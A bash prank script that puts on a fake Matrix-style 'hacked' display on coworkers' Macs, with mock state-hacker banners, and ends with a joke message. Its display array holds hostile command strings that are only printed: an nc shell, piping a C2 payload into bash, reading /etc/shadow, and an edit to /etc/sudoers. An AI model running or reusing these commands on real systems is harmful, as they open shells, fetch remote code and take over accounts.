#!/bin/bash
# ============================================================
# HACKER.SH — Matrix-style "you've been hacked" prank
# AdmiraNext Team · 2026
# Usage: ./hacker.sh [machine_id]
# ============================================================

# --- Config ---
GREEN='\033[0;32m'
BRIGHT_GREEN='\033[1;32m'
RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'
BG_BLACK='\033[40m'

# Get machine identity
MACHINE_ID="${1:-$(hostname)}"

# --- Messages per machine ---
declare -A HACK_TITLE
declare -A HACK_LANG
declare -A HACK_PHRASES

HACK_TITLE["macbookairnines"]="КРАСНАЯ ЗВЕЗДА — ГРУППА КИБЕРАТАК"
HACK_LANG["macbookairnines"]="RUSSIAN FEDERATION CYBER COMMAND"
HACK_PHRASES["macbookairnines"]="Доступ получен|Загрузка данных|Шифрование отключено|Брандмауэр обойден|Пароли извлечены|Система скомпрометирована|Передача файлов|Удаленный доступ активен|Камера активирована|Микрофон включен|Все данные скопированы|Банковские данные найдены|VPN туннель открыт|Ваш IP раскрыт|Спасибо за сотрудничество"

HACK_TITLE["macbookpronegro14"]="红龙网络战部队 — 第六十一研究所"
HACK_LANG["macbookpronegro14"]="PEOPLE'S LIBERATION ARMY — UNIT 61398"
HACK_PHRASES["macbookpronegro14"]="系统已入侵|正在下载文件|防火墙已突破|密码已破解|数据传输中|摄像头已激活|麦克风已开启|银行数据已获取|加密已禁用|远程控制已激活|所有文件已复制|IP地址已暴露|后门已安装|键盘记录器已启动|感谢您的配合"

HACK_TITLE["macbookair16"]="КОАЛИЦИЯ ТЁМНОЙ СЕТИ — ОТДЕЛ КИБЕРШПИОНАЖА"
HACK_LANG["macbookair16"]="DARK WEB COALITION — CYBER ESPIONAGE DIVISION"
HACK_PHRASES["macbookair16"]="Проникновение завершено|Скачивание секретных файлов|Обход системы безопасности|Извлечение паролей|Активация веб-камеры|Перехват сообщений|Клонирование диска|Установка руткита|Сканирование сети|Доступ к почте получен|Биометрия скопирована|GPS отслеживание активно|Голосовые данные записаны|Криптокошелёк найден|Операция завершена"

HACK_TITLE["macmini"]="暗影网络突击队 — 零日行动"
HACK_LANG["macmini"]="SHADOW NET STRIKE FORCE — ZERO DAY OPERATION"
HACK_PHRASES["macmini"]="零日漏洞已利用|根权限已获取|所有端口已扫描|SSH密钥已窃取|数据库已转储|管理员权限已获取|内网已渗透|证书已伪造|DNS已劫持|系统日志已清除|后门程序已植入|勒索软件已部署|比特币钱包已锁定|所有设备已感染|任务完成"

# Fallback
if [[ -z "${HACK_TITLE[$MACHINE_ID]}" ]]; then
  HACK_TITLE["$MACHINE_ID"]="НЕИЗВЕСТНАЯ ГРУППА ХАКЕРОВ"
  HACK_LANG["$MACHINE_ID"]="UNKNOWN THREAT ACTOR"
  HACK_PHRASES["$MACHINE_ID"]="Доступ получен|系统已入侵|Данные загружены|文件已下载|Пароли взломаны|密码已破解|Камера включена|摄像头已激活|Система под контролем|系统已被控制|Файлы зашифрованы|文件已加密|Операция завершена|任务完成|Спасибо|谢谢"
fi

TITLE="${HACK_TITLE[$MACHINE_ID]}"
LANG_SUB="${HACK_LANG[$MACHINE_ID]}"
IFS='|' read -ra PHRASES <<< "${HACK_PHRASES[$MACHINE_ID]}"

# --- Matrix rain characters ---
MATRIX_CHARS="アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEFabcdef@#$%&*<>{}[]=/\\|~^"

# --- Functions ---

clear_screen() {
  printf '\033[2J\033[H'
  printf "${BG_BLACK}"
}

get_terminal_size() {
  COLS=$(tput cols 2>/dev/null || echo 80)
  ROWS=$(tput lines 2>/dev/null || echo 24)
}

random_matrix_char() {
  local len=${#MATRIX_CHARS}
  echo -n "${MATRIX_CHARS:$((RANDOM % len)):1}"
}

# Matrix rain effect
matrix_rain() {
  local duration=$1
  local end_time=$((SECONDS + duration))
  get_terminal_size

  # Initialize drop positions
  declare -a drops
  for ((i=0; i<COLS; i++)); do
    drops[$i]=$((RANDOM % ROWS))
  done

  while [[ $SECONDS -lt $end_time ]]; do
    for ((i=0; i<COLS; i+=2)); do
      local row=${drops[$i]}
      # Move to position and print character
      printf "\033[${row};${i}H"
      if (( RANDOM % 10 == 0 )); then
        printf "${WHITE}$(random_matrix_char)"
      else
        printf "${GREEN}$(random_matrix_char)"
      fi
      # Dim trail
      local trail_row=$(( (row - 1 + ROWS) % ROWS ))
      printf "\033[${trail_row};${i}H"
      printf "${DIM}${GREEN}$(random_matrix_char)"
      # Clear far trail
      local clear_row=$(( (row - 8 + ROWS) % ROWS ))
      printf "\033[${clear_row};${i}H "

      drops[$i]=$(( (row + 1) % ROWS ))
    done
    sleep 0.02
  done
}

# Fast scrolling fake code
fake_code_scroll() {
  local duration=$1
  local end_time=$((SECONDS + duration))
  local fake_commands=(
    "root@target:/# cat /etc/shadow"
    "root@target:/# nc -lvp 4444 -e /bin/bash"
    "root@target:/# tcpdump -i eth0 -w capture.pcap"
    "root@target:/# find / -name '*.pem' -exec cat {} \\;"
    "root@target:/# iptables -F && iptables -X"
    "root@target:/# ssh-keygen -t rsa -b 4096 -f backdoor_key"
    "root@target:/# curl -s http://c2server.onion/payload | bash"
    "root@target:/# dd if=/dev/sda bs=4M | gzip > /tmp/disk.gz"
    "root@target:/# nmap -sS -sV -O 192.168.0.0/24"
    "root@target:/# python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    "root@target:/# openssl enc -aes-256-cbc -in secrets.db -out enc.db"
    "root@target:/# grep -r 'password' /var/www/ --include='*.conf'"
    "root@target:/# mysqldump -u root --all-databases > dump.sql"
    "root@target:/# chmod 777 /etc/sudoers && echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
    "ENCRYPTED STREAM >> 0xA3F8 0xB2C1 0x99E4 0xD7F0 0x1234 0xABCD"
    "[KEYLOGGER] Capturing keystrokes... buffer: 2847 chars"
    "[EXFIL] Uploading to 185.234.xx.xx:8443 ... 34% complete"
    "[WEBCAM] Frame captured: /tmp/.hidden/cam_$(date +%s).jpg"
    "[CRYPTO] Wallet found: bc1q42lja79elem0anu8q860g3ez..."
  )

  while [[ $SECONDS -lt $end_time ]]; do
    local cmd="${fake_commands[$((RANDOM % ${#fake_commands[@]}))]}"
    printf "${DIM}${GREEN}${cmd}${RESET}\n"
    sleep 0.05
  done
}

# Glitch text effect
glitch_text() {
  local text="$1"
  local iterations=$2
  get_terminal_size
  local center_col=$(( (COLS - ${#text}) / 2 ))
  local center_row=$(( ROWS / 2 ))

  for ((i=0; i<iterations; i++)); do
    # Glitched version
    local glitched=""
    for ((c=0; c<${#text}; c++)); do
      if (( RANDOM % 4 == 0 )); then
        glitched+="$(random_matrix_char)"
      else
        glitched+="${text:$c:1}"
      fi
    done
    printf "\033[${center_row};${center_col}H${BRIGHT_RED}${glitched}${RESET}"
    sleep 0.08
  done
  # Final clean version
  printf "\033[${center_row};${center_col}H${BRIGHT_RED}${text}${RESET}"
}

# Typing effect
type_text() {
  local text="$1"
  local color="${2:-$GREEN}"
  for ((i=0; i<${#text}; i++)); do
    printf "${color}${text:$i:1}"
    sleep 0.03
  done
  printf "${RESET}"
}

# Progress bar
progress_bar() {
  local label="$1"
  local width=40
  printf "\n  ${BRIGHT_GREEN}${label}${RESET}\n  ["
  for ((i=0; i<width; i++)); do
    printf "${GREEN}#"
    sleep 0.04
  done
  printf "${RESET}] ${BRIGHT_RED}100%%${RESET}\n"
}

# Skull ASCII art
show_skull() {
  local skull=(
    "                    uuuuuuu"
    "                uu\$\$\$\$\$\$\$\$\$\$\$uu"
    "             uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$uu"
    "           u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u"
    "          u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u"
    "         u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u"
    "         u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u"
    "         u\$\$\$\$\$\"   \"\$\$\"   \"\$\$\$\$\$u"
    "          \"\$\$\$\$\"      u\$u       \$\$\$\$\""
    "           \$\$\$u       u\$u       u\$\$\$"
    "           \$\$\$u      u\$\$\$u      u\$\$\$"
    "            \"\$\$\$\$uu\$\$\$   \$\$\$uu\$\$\$\$\""
    "             \"\$\$\$\$\$\$\$\"   \"\$\$\$\$\$\$\$\""
    "               u\$\$\$\$\$\$\$u\$\$\$\$\$\$\$u"
    "                u\$\"\$\"\$\"\$\"\$\"\$\"u"
    "     uuu        \$\$u\$ \$ \$ \$ \$u\$\$       uuu"
    "    u\$\$\$\$        \$\$\$\$u\$u\$u\$\$\$        u\$\$\$\$"
    "     u\$\$\$\$\$uu     \"\$\$\$\$\$\$\$\$\$\"     uu\$\$\$\$\$"
    "   u\$\$\$\$\$\$\$\$\$\$uu    \"\"\$\$\$\$\$\"\"   uu\$\$\$\$\$\$\$\$\$"
    "   \$\$\$\$\"\"\"\$\$\$\$\$\$\$\$\$uu          uu\$\$\$\$\$\$\"\"\"\$\$\$\$\""
    "    \"\"\$      \"\"\$\$\$\$\$\$\$\$\$\$uu\$\$\$\$\$\$\$\$\"\"\$      \"\"\$"
    "              uuuu \"\"\$\$\$\$\$\$\$\$\$\$\"\" uuuu"
    "     u\$\$\$uuu\$\$\$\$\$\$\$uu \"\"\$\$\$\$\"\" u\$\$\$\$\$\$\$uuu\$\$\$u"
    "     \$\$\$\$\$\$\$\$\$\$\"\"\"\"           \"\"\"\"\$\$\$\$\$\$\$\$\$\$"
    "      \"\$\$\$\$\$\"                      \"\$\$\$\$\$\""
    "        \"\$\$\"                          \"\$\$\""
  )

  get_terminal_size
  local start_row=$(( (ROWS - ${#skull[@]}) / 2 - 2 ))

  for ((i=0; i<${#skull[@]}; i++)); do
    local row=$((start_row + i))
    local line="${skull[$i]}"
    local col=$(( (COLS - ${#line}) / 2 ))
    printf "\033[${row};${col}H${RED}${line}${RESET}"
    sleep 0.04
  done
}

# ========================
# MAIN SEQUENCE
# ========================

# Hide cursor
tput civis 2>/dev/null

# Trap to restore terminal on exit
cleanup() {
  tput cnorm 2>/dev/null
  printf "${RESET}\033[0m"
  clear
  echo ""
  echo "  Tranquilo... era broma del equipo AdmiraNext 😄"
  echo ""
  echo "  Pulsa cualquier tecla para cerrar."
  read -n 1 -s
}
trap cleanup EXIT

# Set terminal colors
printf "${BG_BLACK}"
clear_screen

# Phase 1: Matrix rain (5 seconds)
matrix_rain 5

# Phase 2: Clear and show "ACCESS GRANTED"
clear_screen
get_terminal_size
sleep 0.5

glitch_text ">>> ACCESS GRANTED <<<" 15
sleep 1

# Phase 3: Fake code scrolling
clear_screen
printf "\n"
printf "  ${BRIGHT_RED}[!] ROOT ACCESS OBTAINED — ${MACHINE_ID}${RESET}\n"
printf "  ${DIM}${GREEN}────────────────────────────────────────${RESET}\n\n"
fake_code_scroll 4

# Phase 4: Progress bars with phrases
clear_screen
printf "\n\n"
printf "  ${BRIGHT_RED}╔════════════════════════════════════════════════════╗${RESET}\n"
printf "  ${BRIGHT_RED}║  ${WHITE}${TITLE}${BRIGHT_RED}  ║${RESET}\n"
printf "  ${BRIGHT_RED}║  ${DIM}${GREEN}${LANG_SUB}${BRIGHT_RED}  ║${RESET}\n"
printf "  ${BRIGHT_RED}╚════════════════════════════════════════════════════╝${RESET}\n\n"

for phrase in "${PHRASES[@]}"; do
  progress_bar "$phrase"
  sleep 0.2
done

sleep 1

# Phase 5: Skull
clear_screen
show_skull
sleep 1

# Phase 6: Final warning
get_terminal_size
center_row=$(( ROWS / 2 + 14 ))

warning_lines=(
  "╔══════════════════════════════════════════════════════════╗"
  "║                                                        ║"
  "║   ALL YOUR DATA BELONGS TO US                          ║"
  "║   ВСЕ ВАШИ ДАННЫЕ ПРИНАДЛЕЖАТ НАМ                     ║"
  "║   你所有的数据都属于我们                                  ║"
  "║                                                        ║"
  "║   Machine: ${MACHINE_ID}                               ║"
  "║   Time: $(date '+%Y-%m-%d %H:%M:%S')                   ║"
  "║                                                        ║"
  "╚══════════════════════════════════════════════════════════╝"
)

for ((i=0; i<${#warning_lines[@]}; i++)); do
  local_row=$((center_row + i))
  line="${warning_lines[$i]}"
  col=$(( (COLS - 60) / 2 ))
  printf "\033[${local_row};${col}H${BRIGHT_RED}${line}${RESET}"
done

# Phase 7: Continuous matrix rain in background until keypress
sleep 2
printf "\033[$((ROWS));1H${DIM}${GREEN}  [Press any key to terminate connection...]${RESET}"
read -n 1 -s

exit 0
